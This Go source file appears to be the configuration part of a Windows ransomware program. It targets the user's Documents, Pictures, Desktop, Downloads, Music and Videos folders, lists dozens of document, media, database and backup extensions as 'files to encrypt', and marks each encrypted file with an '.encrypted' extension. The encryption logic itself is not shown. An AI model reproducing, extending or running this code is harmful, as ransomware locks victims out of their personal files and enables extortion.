package cmd

import (
	"fmt"
	"log"
	"os"
	"runtime"
)

var (
	// Base directory
	BaseDir = fmt.Sprintf("%s\\", os.Getenv("USERPROFILE"))

	// Temp Dir
	TempDir = func() string {
		if os.Getenv("TEMP") != "" {
			return os.Getenv("TEMP")
		} else {
			return os.Getenv("USERPROFILE") + `AppData\Local\Temp\`
		}
	}()

	// Directories inside BaseDir to loop over
	InterestingDirs = []string{
		"Pictures", "Documents", "Music", "Desktop", "Downloads", "Videos",
	}

	// Interesting extensions to match files
	InterestingExtensions = []string{
		// Text Files
		"doc", "docx", "msg", "odt", "wpd", "wps", "txt",
		// Data files
		"csv", "pps", "ppt", "pptx",
		// Audio Files
		"aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
		// Video Files
		"3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv",
		// 3D Image files
		"3dm", "3ds", "max", "obj", "blend",
		// Raster Image Files
		"bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "gif", "ico",
		// Vector Image files
		"ai", "eps", "ps", "svg",
		// Page Layout Files
		"pdf", "indd", "pct",
		// Spreadsheet Files
		"xls", "xlr", "xlsx",
		// Database Files
		"accdb", "sqlite", "dbf", "mdb", "pdb", "sql",
		// Game Files
		"dem", "gam", "nes", "rom", "sav",
		// Temp Files
		"bkp", "bak", "tmp",
		// Config files
		"cfg", "ini", "prf",
	}

	// Files to encrypt that match the extensions pattern
	MatchedFiles = make(chan File)

	// Workers processing the files
	NumWorkers = 2

	// Extension appended to files after encryption
	EncryptionExtension = ".encrypted"
)

// Execute only on windows
func CheckOS() {
	if runtime.GOOS != "windows" {
		log.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
	}
}
